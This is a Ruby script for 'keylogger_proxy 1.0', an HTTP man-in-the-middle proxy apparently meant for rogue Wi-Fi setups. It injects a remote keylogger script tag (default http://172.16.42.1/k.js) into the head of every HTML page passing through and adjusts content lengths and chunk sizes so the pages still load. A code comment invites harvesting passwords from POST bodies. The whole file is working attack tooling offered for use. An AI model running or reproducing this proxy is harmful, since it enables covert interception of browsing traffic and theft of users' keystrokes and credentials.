#!/usb/usr/bin/ruby
#
# This is based on original work by:
#
# Copyright (C) 2009 Torsten Becker <torsten.becker@gmail.com>
# 
# Which I found at:
#
# https://gist.github.com/74107
#

require 'socket'
require 'uri'
require 'getoptlong'

SCRIPT_INJECT = '<script src="http://172.16.42.1/k.js"></script>'
DEBUG = 100
VERBOSE = 50
MESSAGE = 0

@verbose = true

class Proxy  
	@verbose_level = 0
	@upstream_host = nil
	@upstream_port = nil
	@script_inject

  	# upstream host and port will be used in version 2, for now they are ignored
	def run port, verbose_level, script_inject, upstream_host, upstream_port
		begin
			# Start our server to handle connections (will raise things on errors)
			@socket = TCPServer.new port
			@verbose_level = verbose_level
			@upstream_host = upstream_host
			@upstream_port = upstream_port
			@script_inject = script_inject

			request_number = 0
			# Handle every request in another thread
			loop do
				s = @socket.accept

				Thread.new s, request_number, &method(:handle_request)
				request_number += 1
			end

		# CTRL-C
		rescue Interrupt
			puts 'Got Interrupt..'
			# Ensure that we release the socket on errors
		ensure
			if @socket
				@socket.close
				puts 'Socked closed..'
			end
			puts 'Quitting.'
		end
	end

	def write_debug request_number, string, level = VERBOSE
		if @verbose_level >= level
			puts "%05d %s" % [request_number, string]
		end
	end

	# to_client is the socket that goes to the client
	# so to_server is the one that connects to the website

	def handle_request to_client, request_number
		write_debug(request_number, "Handling new request", MESSAGE)
		request_line = to_client.readline.chomp

		verb = request_line[/^\w+/]
		url = request_line[/^\w+\s+(\S+)/, 1]
		version = request_line[/HTTP\/(1\.\d)\s*$/, 1]
		uri = URI::parse url
		host = ''
		port = 80
		
		request_lines = []
		request_lines << request_line

		loop do 
			line = to_client.readline.chomp

			if line =~ /^Host: (.*)$/
				host = $1
				if host =~ /([^:]*):([0-9]*)$/
					host = $1
					port = $2.to_i
				else
					port = 80
				end
			end
			request_lines << line

			if line == ""
				break
			end
		end

		write_debug(request_number, "Make connection to " + host + " on port " + port.to_s, VERBOSE)
		
		# Show what got requested
		write_debug(request_number, verb + " " + url, VERBOSE)
		# This has a little more info if you want it
		# write_debug(request_number, "#{verb} #{uri.path}?#{uri.query} HTTP/#{version}\r\n")

		to_server = TCPSocket.new(host, port)
		
		content_len = 0

		request_lines.each do |line|
			if line =~ /^Content-Length:\s+(\d+)\s*$/
				content_len = $1.to_i
			end

			if line =~ /Connection: keep-alive/
				line = "Connection: close"
			end

			if line =~ /^Accept-Encoding:.*/
				# Strip any compression
				next
			else
				to_server.write(line + "\n")
				if line == ""
					break
				end
			end
		end

		# If there is post data then there will be one more line to read
		if content_len > 0
			write_debug(request_number, "Its a POST, read " + content_len.to_s + " bytes of data and write it out", DEBUG)
			# Having to use read not readline here as there is no new line
			# on the end of this so just read the number of bytes I'm told to 
			# and no more
			line = to_client.read(content_len)
			# Here you have full access to everything that is being posted so feel free
			# to parse through fields, pull out passwords and other juicy stuff.
			# You may have captured most of this with the key logger but this is the 
			# real data that is being sent so may as well grab it here as well
			#
			# No new line on the end of this
			to_server.write(line)
		end

		# Optimisation, check the file extension and if it is image,
		# css, js or other static stuff then do a quick loop, same
		# for HEAD or CONNECT, otherwise drop into the next to do
		# injection

		extension = File.extname(uri.path)

		# black listing is a bad way to do this but as it is probably better
		# to parse a page and not inject into it than to miss a page
		# I think it is better to just remove things we know we don't want
		# to parse.
		if extension =~ /(txt)|(js)|(swf)|(pdf)|(gif)|(jpg)|(css)|(xml)|(png)|(rss)/i or verb =~ /(head)|(connect)|(trace)/i
			# write_debug request_number, "Not web page, don't care", DEBUG

			buff = ""
			loop do
				to_server.read(4048, buff)
				to_client.write(buff)
				break if buff.size < 4048
			end
		else
			write_debug request_number, "Headers done, proxying data", VERBOSE
			buff = ""
			do_inject = false
			injected = false
			fixup = true
			chunk = false

			loop do
				to_server.read(4050, buff)
				break if buff.size == 0

				write_debug(request_number, "Buffer length = " + buff.length.to_s, DEBUG)
				write_debug(request_number, "First 10: " + buff[0, 10].inspect, DEBUG)
				write_debug(request_number, "Last 10: " + buff[-10, 10].inspect, DEBUG)

				# This dumps the full buffer, only really needed for hardcore debugging
				# write_debug request_number, buff, DEBUG
				# Is it a HTML page?
				if (buff =~ /Content-Type: text\/html/)
					if buff.match(/Content-Length: ([0-9]*)/)
						old_length = $1.to_i
						new_length = old_length + @script_inject.length
						write_debug request_number, "Length adjusted (" + old_length.to_s + " to " + new_length.to_s + ") ready for injection", DEBUG
						buff["Content-Length: " + old_length.to_s] = "Content-Length: " + new_length.to_s
						do_inject = true
					elsif buff.match(/Transfer-Encoding: chunked/)
						# chunked encoding doesn't have a length so don't need to patch it up
		#				do_inject = true
						write_debug request_number, "Chunked encoding", DEBUG
						fixup = false
						chunk = true
					else
						write_debug request_number, "No length type specified, odd", DEBUG
					end
					
					# Doing this in its own loop as the head isn't necessariliy in the same packet as the transfer encoding tag 
					injected = false
					buff_a = []
					if chunk and buff.match(/<head/i)
						# with chunk encoding there is a blank line after the HTML header
						# then before the data is a hex string saying the size of the chunk
						# that is about to be sent

						patch_next = false
						# Can't do an inplace replace so easiest thing to do is to
						# just push it all into a new buffer
						new_buff = ""

						buff_a = buff.split(/\r\n/)

						index = 0
						buff_a.each do |line|
							if line.match /(<head[^>]*>)/i
								head = $1
								write_debug request_number, "Head found: " + head, DEBUG
								buff_a[index][head] = head + @script_inject
							#	write_debug request_number, "New head: " + buff_a[index][head], DEBUG
								write_debug request_number, "New head real: " + head + @script_inject, DEBUG
								write_debug request_number, "Keylogger Injected Into - " +  host, VERBOSE
								injected = true
								break
							end
							index += 1
						end

						if injected
							index.downto(0) do |rev_index|
								line = buff_a[rev_index].strip
								if line == "" and line.match(/^([0-9a-h]*)$/)
									old_length = buff_a[rev_index + 1].to_i(16)
									new_length = old_length + @script_inject.length
									buff_a[rev_index + 1] = new_length.to_s(16)
									write_debug request_number, "Length adjusted (" + old_length.to_s + " to " + new_length.to_s + ") ready for injection", DEBUG
									break
								end
							end
						end
						buff = buff_a.join("\r\n")
					end
				else
					# write_debug request_number, "no type match"
				end
				# doing this outside the other loop as a page could be broken down into lots of small reads
				if do_inject
					if buff.match /(<head[^>]*>)/i
						head = $1


						write_debug request_number, "Head found: " + head, DEBUG


						#write_debug request_number, head
						buff[head] = head + @script_inject
						write_debug request_number, "New head real: " + buff[head] + @script_inject, DEBUG
						write_debug request_number, "Keylogger Injected Into - " +  host, VERBOSE
						
						injected = true
					else
				#		write_debug request_number, "no head match"
					end
				end
				# Dump the full buffer after it has been patched up
				#write_debug request_number, buff, DEBUG
				to_client.write(buff)
				write_debug request_number, "Buffer size written to client: " + buff.size.to_s, DEBUG
				#break if buff.size < 4048
			end

			# if for some reason we couldn't inject, the send a bunch of spaces
			# of the right length at the end so the content length still matches up
			if !injected and fixup
				write_debug request_number, "Space injected to patch up"
				to_client.write(" " * @script_inject.length)
			end
		end
			
		# Close the sockets
		to_client.close
		to_server.close
	end
end

opts = GetoptLong.new(
	[ '--help', '-h', GetoptLong::NO_ARGUMENT ],
	[ '--verbose', '-v', GetoptLong::NO_ARGUMENT ],
	[ '--debug', '-d', GetoptLong::NO_ARGUMENT ],
	[ '--upstream-host' , GetoptLong::REQUIRED_ARGUMENT ],
	[ '--upstream-port' , GetoptLong::REQUIRED_ARGUMENT ],
	[ '--port', "-p" , GetoptLong::REQUIRED_ARGUMENT ],
	[ '--script-inject', "-s" , GetoptLong::REQUIRED_ARGUMENT ],
)

# Display the usage
def usage
	puts"keylogger_proxy 1.0 Robin Wood (robin@digininja.org) (www.digininja.org)

Usage: keylogger_proxy [OPTION] ... 
	--help, -h: show help
	--verbose, -v: verbose mode
	--debug, -d: debug mode - verbose and more
	--port <port>, -p <port>: port to listen on, default 8008
	--script-inject <script>, -s <script-inject>: the script to inject, make sure
		you escape quotes where necessary.
		Default: #{SCRIPT_INJECT}
	--upstream-host <host>: upstream host, currenty unuse
	--upstream-port <port>: upstream port, currenty unused

"
	exit
end

port = 8008
verbose_level = 0
upstream_host = nil
upstream_port = nil
script_inject = SCRIPT_INJECT

begin
	opts.each do |opt, arg|
		case opt
		when '--help'
			usage
		when "--debug"
			verbose_level = DEBUG
		when "--verbose"
			verbose_level = VERBOSE
		when "--upstream-host"
			upstream_host = arg
		when "--upstream-port"
			upstream_port = arg.to_i
		when "--port"
			port = arg.to_i
		when "--script-inject"
			script_inject = arg
		end
	end
rescue
	usage
end

puts "Starting listening on port " + port.to_s
Proxy.new.run port, verbose_level, script_inject, upstream_host, upstream_port
